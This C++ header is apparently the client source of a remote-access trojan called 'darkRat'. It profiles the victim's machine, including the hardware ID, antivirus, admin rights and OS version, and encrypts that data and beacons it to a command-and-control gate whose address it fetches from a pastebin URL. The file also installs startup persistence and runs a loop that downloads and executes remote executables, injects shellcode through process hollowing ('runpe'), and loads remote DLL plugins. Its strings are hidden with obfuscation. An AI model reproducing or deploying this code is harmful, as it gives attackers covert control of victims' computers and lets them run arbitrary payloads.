
#pragma once
#include <fstream>
#include <hstring.h>


struct ComInit
{
	HRESULT hr;
	ComInit() : hr(::CoInitialize(nullptr)) {}
	~ComInit() { if (SUCCEEDED(hr)) ::CoUninitialize(); }
};

typedef int(__stdcall* f_funci)();

class Client
{
public:
	typedef void(_cdecl* func)(std::string test);




	std::string checkIfRegKeyExists(std::string key) {
		LONG lResult;
		HKEY hKey;
		lResult = RegOpenKeyEx(HKEY_LOCAL_MACHINE, TEXT(key.c_str()), 0, KEY_READ, &hKey);
		if (lResult != ERROR_SUCCESS) {
			if (lResult == ERROR_FILE_NOT_FOUND) {
				return "false";
			}
		}
		return "true";
	}




	static std::string returnFinalPost(darkRat::config::config config) {
		std::string net2 = Helpers::checkIfRegKeyExists(OBFUSCATE("SOFTWARE\\Microsoft\\Net Framework Setup\\NDP\\v2.0.50727"));
		std::string net3 = Helpers::checkIfRegKeyExists(OBFUSCATE("SOFTWARE\\Microsoft\\Net Framework Setup\\NDP\\v3.0"));
		std::string net35 = Helpers::checkIfRegKeyExists(OBFUSCATE("SOFTWARE\\Microsoft\\Net Framework Setup\\NDP\\v3.5"));
		std::string net4 = Helpers::checkIfRegKeyExists(OBFUSCATE("SOFTWARE\\Microsoft\\Net Framework Setup\\NDP\\v4"));

		std::string cpuName = base64_encode((const unsigned char*)OsHelpers::getCpuName().c_str(), OsHelpers::getCpuName().length());
		std::string prcessorArchitecture = base64_encode((const unsigned char*)OsHelpers::PrcessorArchitecture().c_str(), OsHelpers::PrcessorArchitecture().length());
		std::string gpuName = base64_encode((const unsigned char*)OsHelpers::getGpuName().c_str(), OsHelpers::getGpuName().length());
		std::string av = base64_encode((const unsigned char*)Helpers::getCurrentAv().c_str(), Helpers::getCurrentAv().length());
		std::string winver = base64_encode((const unsigned char*)Helpers::GetWindowsVersionString().c_str(), Helpers::GetWindowsVersionString().length());

		std::string args = 
			"hwid=" + Helpers::GetMachineGUID() +
			"&computername=" + Helpers::getComputerName() +
			"&aornot=" + OsHelpers::checkPEIsAdmin() +
			"&installedRam=" + OsHelpers::getRam() +
			"&netFramework2=" + net2 +
			"&netFramework3=" + net3 +
			"&netFramework35=" + net35 +
			"&netFramework4=" + net4 +
			"&antivirus=" + av +
			"&botversion=" +config.versionID +
			"&gpuName=" + gpuName +
			"&cpuName=" + cpuName +
			"&arch=" + prcessorArchitecture +
			"&operingsystem=" + winver;
			"&spreadtag=" + config.spreadtag;
		std::string finalPost = "request=" + XOR::encryptReqeust(args);
		
		return finalPost;
	}

	static void darkMainThread(darkRat::config::config config) {
		//darkRat::config::config config = darkRat::config::load();
		std::thread startupPersistence;
		std::thread runningPlugin;
		//Fetch Gate from raw Site
		std::string gateFromPatebin = XOR::Decrypt(postRequest(config.pastebinUrl, "", "GET"));
		//Main
		std::string guid = Helpers::GetMachineGUID();
		std::string finalPost = Client::returnFinalPost(config);

		if (config.startup == OBFUSCATE("true")) {
			try {
				startupPersistence = std::thread(Helpers::addstartup);
			}
			catch (const std::exception & e) {
				std::cerr << OBFUSCATE("Startup failed, error: ") << e.what() << std::endl;
			}
		}

		while (true) {
			try {
				std::string responseFromGate = postRequest(gateFromPatebin, finalPost, "POST", config.useragent);
				std::cout << responseFromGate;
				if (responseFromGate.find(OBFUSCATE("dande")) != std::string::npos) {
					std::vector<std::string> v = Helpers::explode(";", responseFromGate);
					std::string random_str = Helpers::RandomString(10);
					std::string url(v[2]);
					std::string file((std::string)getenv(OBFUSCATE("TEMP")) + "\\" + random_str + OBFUSCATE(".exe"));
					Helpers::downloadFile(url, file);
					std::string started = Helpers::startNewProcess(file);
					postRequest(gateFromPatebin, "hwid=" + guid + "&taskstatus=" + started + "&taskid=" + v[0], "POST", config.useragent);
				}
				else if (responseFromGate.find(OBFUSCATE("runpe")) != std::string::npos) {
					std::vector<std::string> v = Helpers::explode(";", responseFromGate);
					std::string url(v[2]);
					LPVOID shellcode = DownloadURLToBuffer(url.c_str());
					runPE rp;
					TCHAR szFilePath[1024];
					GetModuleFileNameA(0, LPSTR(szFilePath), 1024);
					bool runned = rp.run(LPSTR(szFilePath), shellcode);

					std::string started = OBFUSCATE("failed");
					if (runned) {
						started = OBFUSCATE("injected");
					}
					postRequest(gateFromPatebin, "hwid=" + guid + "&taskstatus=" + started + "&taskid=" + v[0], "POST", config.useragent);
				}
				else if (responseFromGate.find(OBFUSCATE("runplugin")) != std::string::npos) {
					std::vector<std::string> v = Helpers::explode(";", responseFromGate);
					std::string random_str = Helpers::RandomString(10);
					std::string url(v[2]);
					std::string file((std::string)getenv(OBFUSCATE("TEMP")) + "\\" + random_str + OBFUSCATE(".dll"));
					Helpers::downloadFile(url, file);
					std::string started = OBFUSCATE("failed");

			
					HINSTANCE hGetProcIDDLL = LoadLibrary(file.c_str());
					if (hGetProcIDDLL) {
						//started = "loaded";
						if (v[3] != "") {
							func fn = (func)GetProcAddress(hGetProcIDDLL, (LPCSTR)v[3].c_str());
							runningPlugin = std::thread(fn, v[4]);
						}
						started = "success";
					}

					postRequest(gateFromPatebin, "hwid=" + guid + "&taskstatus=" + started + "&taskid=" + v[0], "POST", config.useragent);
				}
				else {
					if (responseFromGate.find(OBFUSCATE("uninstall")) != std::string::npos) {
						if (config.startup == "true") {
							startupPersistence.detach();
						}
						Helpers::uninstall();
						return;
					}
					else if (responseFromGate.find(OBFUSCATE("update")) != std::string::npos) {
						if (config.startup == "true") {
							startupPersistence.detach();
						}
						std::vector<std::string> v = Helpers::explode(";", responseFromGate);
						Helpers::update(v[2]);
						return;
					} else if (responseFromGate.find(OBFUSCATE("killpersistence")) != std::string::npos) {
						if (config.startup == "true") {
							startupPersistence.detach();
						}
						Helpers::killProcessByName(OBFUSCATE("wscript.exe"));
					}
				}
			}
			catch (const std::exception & e) {
				std::cerr << OBFUSCATE("Request failed, error: ") << e.what() << std::endl;
			}
			int requestInterval = std::stoi(config.requestInterval);
			Sleep(requestInterval * 1000);
		}
	}
};

